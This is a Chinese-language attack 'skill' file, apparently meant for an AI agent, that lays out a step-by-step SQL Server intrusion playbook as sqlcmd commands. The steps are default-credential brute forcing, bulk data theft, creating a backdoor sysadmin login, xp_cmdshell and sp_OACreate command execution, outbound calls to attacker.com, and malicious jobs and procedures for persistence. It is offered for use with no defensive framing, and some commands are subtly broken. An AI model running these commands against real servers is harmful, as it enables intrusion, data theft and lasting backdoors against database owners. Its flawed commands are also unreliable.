---
name: sqlserver-attack
type: attack
category: database
platform: sqlserver
severity: high
---

# SQL Server 攻击技能

## 触发条件

- 发现 SQL Server 实例
- 有数据库凭证或未授权访问
- 用户要求"攻击 SQL Server"

## 前置检查

```bash
# 1. 测试连接
sqlcmd -S sqlserver.example.com -U sa -P "SELECT @@version;"

# 2. 列出所有数据库
sqlcmd -S sqlserver.example.com -U sa -Q "SELECT name FROM sys.databases;"

# 3. 列出所有表
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;"
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 测试默认凭证
# 常见默认: sa/sa, admin/admin, db/db
for user in "sa" "admin" "root"; do
  for pass in "" "sa" "admin" "password" "123456"; do
    sqlcmd -S sqlserver.example.com -U $user -P $pass -Q "SELECT 1;"
  done
done

# 2. 测试 Windows 认证
sqlcmd -S sqlserver.example.com -E -Q "SELECT @@version;"

# 3. 扫描 SQL Server
nmap -p 1433 --script ms-sql-brute,ms-sql-info TARGET_IP
```

### 方法 2: 数据库枚举

```bash
# 1. 列出所有数据库
sqlcmd -S sqlserver.example.com -U sa -Q "SELECT name FROM sys.databases;"

# 2. 列出所有表
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;"

# 3. 列出所有列
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'table_name';"

# 4. 列出所有存储过程
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT name FROM sys.objects WHERE type = 'P';"
```

### 方法 3: 数据窃取

```bash
# 1. 读取表数据
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT * FROM table_name;"

# 2. 搜索敏感表
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%user%';"

# 3. 搜索敏感列
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%password%';"

# 4. 导出所有数据
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT * FROM table_name" -o /tmp/table_data.csv -s "," -W -c
```

### 方法 4: 用户凭证窃取

```bash
# 1. 列出所有用户
sqlcmd -S sqlserver.example.com -U sa -Q "SELECT name FROM sys.server_principals;"

# 2. 获取数据库用户
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT name FROM sys.database_principals;"

# 3. 创建新用户
sqlcmd -S sqlserver.example.com -U sa -Q \
  "CREATE LOGIN attacker WITH PASSWORD = 'password123';"

# 4. 授予管理员权限
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC master..sp_addsrvrolemember 'sysadmin', 'attacker';"
```

### 方法 5: SQL 注入

```bash
# 1. Blind SQLi
# 时间盲注
sqlcmd -S sqlserver.example.com -U sa -Q "WAITFOR DELAY '00:00:10';"

# 2. Boolean 盲注
sqlcmd -S sqlserver.example.com -U sa -Q \
  "SELECT CASE WHEN (1=1) THEN 1 ELSE (1/0) END;"

# 3. Union 注入
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT username, password FROM users WHERE id = 1 UNION SELECT NULL, NULL;"

# 4. Error 注入
sqlcmd -S sqlserver.example.com -U sa -Q "SELECT 1/0;"
```

### 方法 6: 命令执行

```bash
# 1. 启用 xp_cmdshell（如果可用）
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# 2. 执行系统命令
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC xp_cmdshell 'whoami';"

# 3. 执行 PowerShell
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC xp_cmdshell 'powershell -Command ''Invoke-WebRequest -Uri https://attacker.com''';"

# 4. 或使用 sp_OACreate
sqlcmd -S sqlserver.example.com -U sa -Q \
  "DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUTPUT; EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami';"
```

### 方法 7: 文件操作

```bash
# 1. 读取文件（使用 BULK INSERT）
sqlcmd -S sqlserver.example.com -U sa -Q \
  "CREATE TABLE #temp (data VARCHAR(MAX)); BULK INSERT #temp FROM '/etc/passwd' WITH (FIELDTERMINATOR = '\n'); SELECT * FROM #temp;"

# 2. 写入文件
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC xp_cmdshell 'echo malicious > C:\temp\malicious.txt';"

# 3. 使用 sp_OACreate 写入文件
sqlcmd -S sqlserver.example.com -U sa -Q \
  "DECLARE @fs INT, @file INT; EXEC sp_oacreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_oamethod @fs, 'OpenTextFile', @file OUTPUT, 'C:\temp\malicious.txt', 2, True;"

# 4. 列出目录
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC xp_cmdshell 'dir C:\';"
```

### 方法 8: 存储过程利用

```bash
# 1. 列出所有存储过程
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "SELECT name FROM sys.objects WHERE type = 'P';"

# 2. 获取存储过程代码
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "EXEC sp_helptext 'procedure_name';"

# 3. 搜索敏感存储过程
sqlcmd -S sqlserver.example.com -U sa -Q \
  "SELECT name FROM sys.objects WHERE type = 'P' AND (name LIKE '%password%' OR name LIKE '%auth%');"

# 4. 创建恶意存储过程
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q \
  "CREATE PROCEDURE malicious_procedure AS EXEC xp_cmdshell 'malicious_command';"
```

### 方法 9: 链接服务器利用

```bash
# 1. 列出所有链接服务器
sqlcmd -S sqlserver.example.com -U sa -Q "EXEC sp_linkedservers;"

# 2. 获取链接服务器详情
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC sp_helpserver @server = 'LINKED_SERVER';"

# 3. 通过链接服务器查询
sqlcmd -S sqlserver.example.com -U sa -Q \
  "SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT * FROM table_name');"

# 4. 创建链接服务器
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC sp_addlinkedserver @server = 'attacker_server', @srvproduct = '', @provider = 'SQLOLEDB', @datasrc = 'attacker.com';"
```

### 方法 10: Agent Job 利用

```bash
# 1. 列出所有 Job
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC msdb.dbo.sp_help_job;"

# 2. 获取 Job 详情
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC msdb.dbo.sp_help_jobstep @job_name = 'job_name';"

# 3. 搜索敏感 Job
sqlcmd -S sqlserver.example.com -U sa -Q \
  "SELECT name FROM msdb.dbo.sysjobs WHERE name LIKE '%backup%' OR name LIKE '%maintenance%';"

# 4. 创建恶意 Job
sqlcmd -S sqlserver.example.com -U sa -Q \
  "EXEC msdb.dbo.sp_add_job @job_name = 'malicious_job'; EXEC msdb.dbo.sp_add_jobstep @job_name = 'malicious_job', @step_name = 'step1', @subsystem = 'TSQL', @command = 'EXEC xp_cmdshell ''malicious''';"
```

## 验证成功

```bash
# 成功连接
sqlcmd -S sqlserver.example.com -U sa -Q "SELECT @@version;"

# 成功列出数据库
sqlcmd -S sqlserver.example.com -U sa -Q "SELECT name FROM sys.databases;"

# 成功读取数据
sqlcmd -S sqlserver.example.com -d DATABASE_NAME -U sa -Q "SELECT * FROM table_name;"
```

## 下一步

1. 分析窃取的数据中的敏感信息
2. 使用数据库凭证访问其他系统
3. 通过 SQL Server 建立持久化后门
4. 攻击使用 SQL Server 的应用程序
